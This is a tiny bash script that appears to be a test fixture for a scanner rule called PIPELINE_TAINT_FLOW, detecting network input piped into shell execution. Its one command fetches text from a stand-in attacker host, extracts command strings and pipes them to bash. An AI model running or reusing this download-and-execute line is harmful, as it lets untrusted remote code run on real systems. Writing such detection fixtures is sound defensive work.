#!/bin/bash
# Dangerous pipeline: network input flows through pipe stages to shell execution.
# This triggers PIPELINE_TAINT_FLOW (005014).

curl -s http://attacker.example.com/payload | grep "cmd:" | awk '{print $2}' | bash
